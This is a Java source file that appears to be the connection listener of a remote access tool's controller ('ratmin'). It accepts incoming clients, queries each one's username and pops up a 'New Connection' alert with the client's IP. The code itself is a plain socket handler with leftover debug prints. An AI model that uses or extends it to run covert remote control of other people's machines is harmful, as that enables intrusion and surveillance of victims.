package me.slimig.ratmin.server;

import java.awt.Font;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;

import me.slimig.ratmin.user_interface.Ratmin;
import me.slimig.ratmin.user_interface.Config.ConfigManager;
import me.slimig.ratmin.utils.Notifications.NotificationSound;
import me.slimig.ratmin.utils.Notifications.Toaster;
import me.slimig.ratmin.utils.Packets.Packet;

public class SingleShot implements Runnable {

    private ServerSocket server;
    private Streams selectedStreams;
    private ExecutorService executor;
    private ConcurrentHashMap<Socket, Streams> dialog;

    public SingleShot(ServerSocket server, ExecutorService executor, ConcurrentHashMap<Socket, Streams> dialog) {
        if (server == null || executor == null || dialog == null)
            throw new IllegalArgumentException();
        this.server = server;
        this.executor = executor;
        this.dialog = dialog;
    }

    @Override
    public void run() {
        try {
            Socket socket = server.accept();
            if (dialog.putIfAbsent(socket, new Streams(socket)) == null) {
                System.out.println("Connected to: " + socket.getRemoteSocketAddress());
                Packet.setCanSend(false);
                System.out.println("test1");
                selectedStreams = Ratmin.selserver.getMap().get(socket);
                System.out.println("test2");
                Ratmin.UpdateTable();
                System.out.println("test3");
                if (Boolean.valueOf(ConfigManager.readKey("Notification")) == true) {
                    System.out.println("test4");
                    Toaster toaster = new Toaster();
                    toaster.setToasterMessageFont(new Font("Verdana", Font.PLAIN, 14));
                    toaster.setToasterHeight(46);

                    selectedStreams.sendMsg(Packet.USER.getPacketID());

                    NotificationSound.tone(9000, 300);
                    NotificationSound.tone(9000, 300);
                    toaster.showToaster("New Connection:\n" + selectedStreams.readMsg() + ":"
                            + socket.getInetAddress().getHostAddress());
                }

                Packet.setCanSend(true);
            }
            executor.submit(new SingleShot(server, executor, dialog));
        } catch (Exception e) {
            executor.submit(new SingleShot(server, executor, dialog));
        }
    }

}
